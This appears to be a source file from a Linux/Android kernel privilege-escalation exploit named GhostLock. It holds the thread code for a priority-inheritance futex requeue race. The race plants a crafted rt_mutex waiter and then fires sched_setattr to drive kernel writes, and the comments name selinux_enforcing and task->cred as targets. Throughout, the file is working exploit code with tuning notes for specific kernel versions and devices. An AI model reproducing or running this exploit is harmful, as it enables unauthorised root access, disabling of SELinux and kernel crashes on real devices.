/*
 * GhostLock 閳?PI race worker threads and the per-write route entry.
 *
 * Split out of main.cpp; the statement order and log text are unchanged.
 */

#include "race/threads.hpp"

#include "attack/ops.hpp"
#include "profile/model.h"
#include "route/route_controller.h"
#include "route/route_policy.hpp"
#include "session/exploit_session.hpp"
#include "support/syscall_snapshot.hpp"

using namespace ghostlock;

namespace ghostlock::race {
    namespace {
        /* Path A gate.
         *
         * The select_stack route arms the consumer before the waiter thread
         * enters pselect(), so the fd_set words only become the crafted
         * rt_mutex_waiter once the syscall has copied them onto the kernel
         * stack. Firing sched_setattr before that walks a half-built waiter,
         * and a fixed delay only guesses at the moment. /proc/<tid>/syscall
         * states it instead of guessing: a task parked inside a syscall
         * prints nine fields and the syscall number, so waiting for that
         * number is a confirmation. Same-thread-group access never reaches
         * the security checks (ptrace_may_access() returns early for it), so
         * a sibling thread can read it with no privileges at all.
         *
         * Returns true only when the snapshot proved it. */
        [[nodiscard]] bool wait_for_waiter_syscall(
            int32_t tid, int32_t number, uint32_t timeout_usec) {
            if (tid <= 0 || number < 0 || timeout_usec == 0) {
                return false;
            }
            char path[64];
            snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
            const uint32_t poll_usec =
                session::g_exploit_session.profile.race_state_poll_interval_us();
            struct timespec start;
            clock_gettime(CLOCK_MONOTONIC, &start);
            for (;;) {
                /* Kernel-space arguments print as 0x + 16 hex digits, so the
                 * nine-field form reaches ~157 bytes; anything shorter can
                 * truncate a real snapshot into an unparsable one. */
                char snapshot[256];
                support::read_first_line(path, snapshot, sizeof(snapshot));
                const support::SyscallSnapshot parsed =
                    support::parse_syscall_snapshot(snapshot);
                if (parsed.kind == support::SyscallSnapshotKind::Sleeping &&
                    parsed.number == number) {
                    return true;
                }
                if (runtime_time::runtime_elapsed_ms(&start) >=
                    static_cast<double>(timeout_usec) / 1000.0) {
                    return false;
                }
                usleep(static_cast<useconds_t>(poll_usec ? poll_usec : 1000));
            }
        }
    } // namespace

    void *waiter_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        const memory::WriteRequest *request = race->request;
        support::disable_rseq_for_thread();
        int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
        race->waiter_tid.store(tid);
        if (support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
            pr_error("waiter lock chain errno=%d\n", errno);
        race->waiter_ready.store(1);
        while (!race->owner_started.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        struct timespec timeout;
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
        if (race->fast_repair.load()) {
            timeout.tv_nsec += 20000000L;
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        } else {
            uint64_t wait_ns =
                    static_cast<uint64_t>(session::g_exploit_session.profile.race_route_wait_ms()) * 1000000ULL;
            timeout.tv_sec += static_cast<time_t>(wait_ns / 1000000000ULL);
            timeout.tv_nsec += static_cast<long>(wait_ns % 1000000000ULL);
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        }
        race->waiter_waiting.store(1);
        errno = 0;
        /* Multicast delivery note (5.10, measured): rt_mutex_init_waiter
         * rewrites tree_entry, pi_tree_entry and task, and
         * task_blocks_on_rt_mutex rewrites task/lock/prio/deadline — so any
         * stamp planted BEFORE the WAIT is erased before the PI walk can
         * read it. The only surviving crafted writer is the route's own
         * reclaim-skb plant into the leaked page (util.cpp prepare_skb_
         * payload), which lands regardless of which thread runs; the
         * setsockopt stamp copy on THIS thread lands after the WAIT has
         * returned (rt_waiter dead) and can only feed the NEXT attempt's
         * frame reuse. Keep the single-phase shape: WAIT → wake/timeout →
         * execute. Variant B keeps the CMP's requeue engaged (CMP ret=1,
         * WAIT=ETIMEDOUT) for the whole route window. */
        long wrq = 0;
        if (race->fast_repair.load()) {
            timeout.tv_nsec += 20000000L;
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
            wrq = support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0,
                                    &timeout, &race->target_futex, 0);
            pr_info("[route] WAIT_REQUEUE_PI ret=%ld errno=%d\n", wrq, errno);
            route::RouteController controller;
            controller.init(race, &session::g_exploit_session.profile);
            race->route_status = controller.execute(request);
            if (controller.fallback_used) {
                pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
            }
            race->route_done.store(1);
            support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
            while (!race->owner_chain_done.load())
                usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
            return nullptr;
        }
        wrq = support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0,
                                &timeout, &race->target_futex, 0);
        /* The requeue lifecycle discriminator: ETIMEDOUT with no prior wake means
         * the CMP_REQUEUE_PI never requeued this q (its trylock aborted early), so
         * pi_blocked_on stayed NULL for the whole window and no PI walk can reach
         * the crafted waiter. ret==0/1 means the requeue path engaged. */
        pr_info("[route] WAIT_REQUEUE_PI ret=%ld errno=%d\n", wrq, errno);
        route::RouteController controller;
        controller.init(race, &session::g_exploit_session.profile);
        race->route_status = controller.execute(request);
        if (controller.fallback_used) {
            pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
        }
        if (route::route_needs_ghost_disarm(session::g_exploit_session.profile) ||
            route::route_needs_stack_disarm(session::g_exploit_session.profile)) {
            /* remove_waiter() left this thread's pi_blocked_on pointing at the
         * reclaimed stack waiter. Force one final slow-path removal while the
         * stack frame is still alive, matching the 5.x multicast primitive's
         * disarm step. Without this, thread exit leaves a walkable dangling
         * ghost and the next mm_struct spray can panic the kernel. select_stack
         * leaves the identical ghost, so it runs the identical step. */
            uint32_t dummy_pi = 0x80000000U | static_cast<uint32_t>(getpid());
            struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
            errno = 0;
            long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
            pr_info("ghost disarm ret=%ld errno=%d\n", disarm, errno);
        }
        race->route_done.store(1);
        support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        while (!race->owner_chain_done.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        return nullptr;
    }

    void *owner_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        long lock_target = support::futex_op(
            &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
        if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
        /* The CMP_REQUEUE_PI trylock returns EDEADLK iff uval(target) TID equals
         * the WAITER's TID. Log who actually owns the word after LOCK_PI so the
         * EDEADLK condition can be checked from the log alone. */
        const int32_t owner_tid = static_cast<int32_t>(syscall(SYS_gettid));
        pr_info("[route] owner tid=%d locked target uval=0x%x (waiter tid=%d)\n",
                owner_tid, race->target_futex,
                race->waiter_tid.load(std::memory_order_relaxed));
        while (!race->waiter_ready.load() &&
               !race->owner_stop.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        if (race->owner_stop.load()) {
            if (lock_target == 0)
                support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
            return nullptr;
        }
        race->owner_started.store(1);
        /* Variant B (multicast 5.10): owner HOLDS the target (so the CMP trylock
         * attaches to its pi_state instead of the TID-0 takeover) but does NOT
         * block on the chain futex yet. With owner->pi_blocked_on == NULL the
         * enqueue-side chain walk is skipped (task_blocks_on_rt_mutex returns 0
         * before adjust_prio_chain), so the deliberate waiter→target→owner→chain
         * cycle never reaches the rt_mutex deadlock detector: the requeue loop
         * links the crafted stack rt_waiter into the target's rt_mutex tree and
         * the waiter's pi_blocked_on points at it — a live PI entity for the
         * consumer's sched_setattr walk. Owner takes the chain edge only after
         * route_done, preserving the waiter-side disarm ordering. */
        while (!race->route_done.load() && !race->owner_stop.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
        race->owner_chain_done.store(1);
        while (!race->owner_stop.load()) sleep(1);
        return nullptr;
    }

    void *consumer_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        kernel::pin_to_core(static_cast<size_t>(race->consumer_cpu));
        pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
        int32_t seen = 0;
        while (!race->consumer_stop.load()) {
            int32_t seq = race->consumer_go.load();
            if (seq == 0 || seq == seen) {
                __asm__ volatile (


                "yield"
                ::: "memory");
                continue;
            }
            seen = seq;
            int32_t tid = race->waiter_tid.load();
            int32_t calls_this_seq = 0;
            while (!race->consumer_stop.load() &&
                   race->consumer_go.load() == seq) {
                uint32_t delay_usec = race->route_delay_usec.load();
                /* Path A gate: a confirmed syscall snapshot replaces the blind
                 * delay, because firing before the waiter parked leaves the
                 * crafted words still in user memory. A timeout keeps the old
                 * behaviour, so an unreadable /proc costs nothing. */
                bool confirmed = false;
                const int32_t gate_syscall = race->consumer_gate_syscall.load();
                if (gate_syscall > 0) {
                    const uint32_t gate_timeout_usec =
                        session::g_exploit_session.profile.select_timeout_us();
                    confirmed = wait_for_waiter_syscall(tid, gate_syscall, gate_timeout_usec);
                    if (confirmed) {
                        pr_info("consumer gate: waiter parked in syscall %d\n",
                                gate_syscall);
                    } else {
                        pr_warning("consumer gate: waiter not in syscall %d after "
                                   "%uus; falling back to the delay ladder\n",
                                   gate_syscall, gate_timeout_usec);
                    }
                    /* The verdict decides whether this attempt is a real race
                     * or a guess, so push it past the stdio buffer: a panic
                     * takes the page cache with it and this is the line that
                     * says which of the two happened. */
                    support::log_sync();
                }
                if (!confirmed && delay_usec > 0) {
                    usleep(static_cast<useconds_t>(delay_usec));
                }
                /* Fire budget. Measured on marble under cold-boot isolation
                 * (rounds-multi-cold): a flat 4 fires per pselect lifted the
                 * non-leaf writes (W1 selinux_enforcing, W2 task->cred) to 6/7,
                 * but every W3 write is a leaf write (leaf=1 -> preserve_child=0)
                 * whose crafted pc is the planted black node -- the first fire
                 * already re-links that node, and the extra walks then re-enter a
                 * dangling ghost, which is why W3 fell to 2/6 and took the run
                 * with it. A leaf write therefore keeps the single fire it always
                 * had; only the preserve_child writes get the ladder. */
                const memory::WriteRequest *write_request = race->request;
                const bool leaf_write =
                        write_request != nullptr && !write_request->preserve_child;
                const uint32_t fire_limit =
                        leaf_write
                            ? 1U
                            : session::g_exploit_session.profile.select_consumer_max_calls();
                for (uint32_t burst = 0;
                     burst < session::g_exploit_session.profile.select_consumer_burst_calls(); burst++) {
                    if (race->consumer_stop.load() ||
                        race->consumer_go.load() != seq)
                        break;
                    race->consumer_calls.fetch_add(1);
                    race->consumer_inflight.store(1);
                    errno = 0;
                    /* rotate the nice every call; (calls%19)+1 is what makes
                 * sched_setattr succeed on 6.1 compact */
                    int32_t consumer_nice = session::g_exploit_session.profile.has_compact_waiter()
                                            ? (calls_this_seq % 19) + 1
                                            : kernel::PSELECT_CONSUMER_NICE;
                    /* Pre-call breadcrumb: this is the last line that must be on
                     * disk before the PI walk is entered. Comparing it with the
                     * post-call line below splits the two candidates for a lost
                     * race -- freeze inside the walk (post-call line missing) vs
                     * freeze somewhere else entirely (pre-call line missing). */
                    pr_info("consumer call %d entering sched_setattr tid=%d nice=%d\n",
                            calls_this_seq + 1, tid, consumer_nice);
                    support::log_sync();
                    long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
                    if (sched_ret != 0) {
                        struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                        long fret = support::futex_op(
                            &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
                        if (fret == 0) {
                            support::futex_op(
                                &race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
                            sched_ret = 0;
                        }
                    }
                    if (sched_ret == 0) race->consumer_success.fetch_add(1);
                    race->consumer_inflight.store(0);
                    calls_this_seq++;
                    /* Localisation breadcrumb. This syscall is what walks the PI
                     * chain, and a lost race turns that walk into a spin with
                     * interrupts off: the machine freezes instead of oopsing, so
                     * kmsg records nothing and the route never reaches its own
                     * post-select line. Fsyncing here splits the two candidates:
                     * if the gate line is the last thing on disk the walk never
                     * returned; if this line is there, it did and the freeze is
                     * on the waiter's side instead. */
                    pr_info("consumer call %d sched_ret=%ld errno=%d success=%d\n",
                            calls_this_seq, sched_ret, errno,
                            race->consumer_success.load());
                    support::log_sync();
                    if (static_cast<uint32_t>(calls_this_seq) >= fire_limit) {
                        race->consumer_go.store(0);
                        break;
                    }
                }
            }
        }
        return nullptr;
    }

    void reset_main_route_state(void) {
        int32_t fast_repair = session::g_exploit_session.race.fast_repair.load();
        if (!session::g_exploit_session.race.reset(
            fast_repair ? 5000 : session::g_exploit_session.profile.select_enter_delay_us(),
            config::runtime_config_snapshot().main_cpu,
            config::runtime_config_snapshot().consumer_cpu)) {
            support::fail_stop_dirty_race("reset with live PI workers", EBUSY);
        }
        session::g_exploit_session.race.fast_repair.store(fast_repair);
    }
} // namespace ghostlock::race

/* Wait for the parked waiter/owner pair, trigger the PI requeue and return the
 * route outcome once the waiter reported completion. The count/timeout policy
 * lives in outcome_with_counters() and TODO(pi-timeout-01). */
ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
    while (!waiter_waiting.load() || !owner_started.load())
        usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
    pr_info("[route] waiter parked; owner started\n");
    usleep(fast_repair.load()
               ? 5000
               : session::g_exploit_session.profile.race_setup_settle_us());
    errno = 0;
    pr_info("[route] firing CMP: waiter_tid=%d target uval=0x%x\n",
            waiter_tid.load(std::memory_order_relaxed),
            target_futex);
    long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                reinterpret_cast<void *>(1),
                                &target_futex, 0);
    pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
            rq, errno);
    /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
     * the race window (observed when the Shizuku log pipe applied
     * backpressure) parks the process forever and the corrupted PI chain is
     * never disarmed. Bound the wait from profile::TargetProfile.execution and map a
     * timeout to ROUTE_DIRTY_FAILURE instead of looping indefinitely. */
    struct timespec wait_started{};
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_started));
    const double timeout_ms = static_cast<double>(
        session::g_exploit_session.profile.race_route_done_timeout_ms());
    while (!route_done.load()) {
        if (runtime_time::runtime_elapsed_ms(&wait_started) >= timeout_ms) {
            return route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 21,
                .error_number = ETIMEDOUT,
            };
        }
        usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
    }
    const route::RouteStatus status = route_status;
    const int32_t calls = consumer_calls.load();
    const int32_t success = consumer_success.load();
    pr_info("[route] route_done status=%d clean=%d/%d step=%d errno=%d "
            "calls=%d success=%d\n", status.code, status.userspace_clean,
            status.kernel_disarmed, status.step, status.error_number,
            calls, success);
    return outcome_with_counters(status, calls, success);
}

namespace ghostlock::race {
    /* Create, synchronize, stop and join one explicitly owned PI race. */
    Status run_main_route_threads(const memory::WriteRequest &request) {
        reset_main_route_state();
        support::spray_breadcrumb("route enter");
        pr_info("[route] creating waiter/owner/consumer\n");
        int32_t error = session::g_exploit_session.race.start_threads(
            waiter_thread, owner_thread, consumer_thread, &request);
        if (error) {
            if (session::g_exploit_session.race.route_status.code ==
                route::ROUTE_DIRTY_FAILURE) {
                support::fail_stop_dirty_race(
                    "partial PI worker startup cleanup", error);
            }
            session::g_exploit_session.race.route_status = route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 20,
                .error_number = error,
            };
            pr_warning("PI race thread creation failed errno=%d\n", error);
            return 0;
        }
        route::RouteStatus status = session::g_exploit_session.race.run();
        if (status.code == route::ROUTE_DIRTY_FAILURE) {
            support::fail_stop_dirty_race("route_done deadline", status.error_number);
        }
        session::g_exploit_session.race.request_stop();
        const int32_t join_error = session::g_exploit_session.race.join();
        if (join_error != 0) {
            support::fail_stop_dirty_race("PI worker join", join_error);
        }
        pr_info("[route] threads joined\n");
        return status.code == route::ROUTE_OK;
    }
} // namespace ghostlock::race
